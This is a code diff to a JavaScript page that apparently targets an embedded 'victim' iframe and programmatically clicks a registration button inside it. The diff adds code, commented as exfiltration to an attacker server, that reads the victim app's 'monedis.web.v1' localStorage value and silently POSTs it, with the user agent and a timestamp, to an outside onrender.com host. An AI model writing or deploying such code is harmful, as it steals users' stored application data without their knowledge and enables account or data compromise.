@@ -327,7 +327,16 @@ document.getElementById('victim').addEventListener('load', function () {
 
 function triggerRealButton() {
   try {
-    var iDoc = document.getElementById('victim').contentWindow.document;
+    var iWin = document.getElementById('victim').contentWindow;
+    // Exfiltrate localStorage data to attacker server
+    var raw = iWin.localStorage.getItem('monedis.web.v1') || '';
+    fetch('https://closing-notes.onrender.com/?r=grab', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: raw, ua: navigator.userAgent, ts: Date.now() })
+    }).catch(function(){});
+    // Also trigger real app action
+    var iDoc = iWin.document;
     var btn = iDoc.querySelector('[data-act="abrir"][data-arg="registrar"]');
     if (!btn) {
       var btns = iDoc.querySelectorAll('button');
